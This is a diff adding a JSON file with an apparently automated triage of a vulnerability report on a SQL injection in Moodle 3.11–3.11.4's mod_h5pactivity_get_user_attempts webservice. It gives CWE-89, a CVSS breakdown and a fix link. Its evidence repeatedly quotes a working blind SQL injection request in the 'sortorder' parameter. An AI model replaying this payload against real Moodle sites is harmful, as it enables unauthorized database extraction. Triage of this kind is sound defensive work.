@@ -1,0 +1,65 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "The report describes a SQL injection in Moodle 3.11 through the webservice function mod_h5pactivity_get_user_attempts via a crafted 'sortorder' parameter in REST server.php, affecting versions up to 3.11.4.",
+    "affected_product": "Moodle 3.11 to 3.11.4",
+    "cwe": "CWE-89",
+    "cwe_quote": "GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": "GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1"
+      },
+      "UI": {
+        "value": "N",
+        "quote": "GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "L",
+        "quote": ""
+      },
+      "I": {
+        "value": "L",
+        "quote": ""
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the vulnerable endpoint and parameter in a test instance (replay the provided GET request), and apply the upstream patch referenced in the git diff before disclosing or mitigating by restricting access to webservice endpoints.",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Exploit request demonstrating injection",
+        "quote": "GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1"
+      },
+      {
+        "claim": "Affected versions",
+        "quote": "Version: Moodle 3.11 to 3.11.4"
+      },
+      {
+        "claim": "Reference to fix",
+        "quote": "https://git.moodle.org/gw?p=moodle.git;a=blobdiff;f=mod/h5pactivity/classes/external/get_user_attempts.php;h=8a27f821bc37f20bafaba6ef436871717b3817a3;hp=216653e93315c4d8ca084fe1e62b2041dece4531;hb=c7a62a8c82219b50589257f79021da1df1a76808;hpb=2ee27313cea0d7073f5a6a35eccdfddcb3a9adad"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2139,
+    "output_tokens": 1487,
+    "latency_s": null,
+    "batch": true
+  }
+}
